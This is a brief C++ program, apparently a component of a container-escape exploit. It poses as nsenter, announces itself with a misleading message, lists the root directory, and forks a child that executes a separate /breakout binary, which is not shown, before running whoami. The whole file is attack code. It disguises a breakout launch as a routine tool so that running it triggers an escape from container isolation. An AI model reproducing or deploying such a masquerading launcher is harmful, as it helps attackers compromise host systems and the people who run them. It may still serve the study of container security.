#include <iostream>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
using namespace std;

int main()
{
    char * argv_break[2];
    cout << "You are using nsenter inside of the container!" << endl;
    system("ls /");
    if (!fork()) {
        // Child runs breakout
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
        system("whoami");
        
     }
     else
        wait(NULL); // Wait for child

    return 0;
}